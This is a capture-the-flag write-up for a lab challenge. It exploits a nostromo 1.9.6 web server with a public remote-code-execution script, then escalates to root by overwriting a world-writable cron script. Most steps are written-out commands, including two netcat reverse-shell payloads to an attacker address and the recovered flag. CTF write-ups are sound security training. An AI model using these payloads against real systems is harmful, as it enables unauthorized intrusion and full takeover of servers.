# My First Blog
## Description:
```
Here is a link to my new blog! I read about a bunch of exploits in common server side blog tools so I just decided to make my website static. Hopefully that should keep it secure.

Root owns the flag.
```

## Nikto:
```
# nikto -host http://172.30.0.2/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.30.0.2
+ Target Hostname:    172.30.0.2
+ Target Port:        80
+ Start Time:         2020-03-27 13:53:37 (GMT1)
---------------------------------------------------------------------------
+ Server: nostromo 1.9.6
...
```
`Nikto` reveals, that `nostromo 1.9.6` is installed.

## searchsploit nostromo:
So we can search for exploits for nostromo using `searchsploit`.
```
# searchsploit nostromo
...
nostromo 1.9.6 - Remote Code Execution | exploits/multiple/remote/47837.py
...
# searchsploit -m exploits/multiple/remote/47837.py
```

## Reverse shell listener on port 1234:
To have a functional shell on the machine, we need to setup a listener for our reverse shell first. This can be done with `nc`.
```
# nc -lvnp 1234
listening on [any] 1234 ...
```

## Exploit
```
# python 47837.py 172.30.0.2 80 "nc 172.30.0.14 1234 -e /bin/bash"
...

connect to [172.30.0.14] from (UNKNOWN) [172.30.0.2] 45418
id
uid=1000(webserver) gid=1000(webserver) groups=1000(webserver)
```

## Privilege Escalation
After examining the files on the victim, I found the following:
```
# cat /etc/crontab
...
* * * * * root /usr/bin/healthcheck
...
```

Here we can see, that the root user has a cronjob on calling `/usr/bin/healthcheck`. Let's check the permissions on that file:
```
# ls -la /usr/bin/healthcheck
-rwxrwxrwx 1 root root 98 Mar 19 18:41 /usr/bin/healthcheck
```

It belongs to the root user and is world writable. This means, that we can just overwrite it:
```
# echo "#!/bin/bash" > /usr/bin/healthcheck
# echo -n "nc 172.30.0.14 4444 -e /bin/bash" >> /usr/bin/healthcheck
```

The next time `/usr/bin/healthcheck` is called, it will pop our reverse shell, which we just need to start the listener on port 4444:

```
# nc -lvnp 4444
listening on [any] 4444
connect to [172.30.0.14] from (UNKNOWN) [172.30.0.2] 36338

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/flag.txt
gigem{l1m17_y0ur_p3rm15510n5}
```
